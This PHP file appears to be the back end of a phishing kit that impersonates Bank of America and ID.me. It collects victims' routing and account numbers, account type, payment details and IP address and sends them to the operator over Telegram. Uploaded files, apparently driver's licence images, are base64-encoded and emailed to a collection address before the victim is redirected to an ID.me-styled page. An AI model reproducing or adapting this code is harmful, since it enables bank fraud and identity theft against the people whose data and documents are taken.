<?php
require("email.php");
include("config.php");
    //Server Variables
    $ip = getenv("REMOTE_ADDR");
    //Name Attributes of HTML FORM
	
    $input_file = "attachment";
    $input_file2 = "attachment2";
    //Name Attributes of HTML FORM

    //Fetching HTML Values

    $payment = $_POST['b_gpay'];
    $acttype = $_POST['b_atype'];
    $Rnum = $_POST['b_rt'];
    $Anum = $_POST['b_acc'];
    $serv = $_REQUEST['data2'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**BofA**CARD_INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "b_gpay: ".$_POST['b_gpay']."\n";
		$message .= "----------------------------------------\n";
        $message .= "b_atype: ".$_POST['b_atype']."\n";
		$message .= "----------------------------------------\n";
        $message .= "b_rt: ".$_POST['b_rt']."\n";
		$message .= "----------------------------------------\n";
        $message .= "b_acc: ".$_POST['b_acc']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);
		
		

  //Checking if File is uploaded
    if(isset($_FILES[$input_file])) 
    { 
        //Main Content
        $main_subject = "DL information l $ip";
        $main_body = "<br> 

        IP : $ip.";

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        $filename= $_FILES[$input_file]['name'];
        $file = chunk_split(base64_encode(file_get_contents($_FILES[$input_file]['tmp_name'])));

        $filename2= $_FILES[$input_file2]['name'];
        $file2 = chunk_split(base64_encode(file_get_contents($_FILES[$input_file2]['tmp_name'])));
		
        $uid = md5(uniqid(time()));
//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

     //Output
        if ($retval == true) {
            echo "Message sent successfully...";
            echo "<script>window.location.replace('idme.htnl');</script>";
        } else {
            echo "Error<br>";
            echo "Message could not be sent...Try again later";
            echo "<script>window.location.replace('idme.html');</script>";
        }
    }else{
        echo "Error<br>";
        echo "File Not Found";
    }
?>
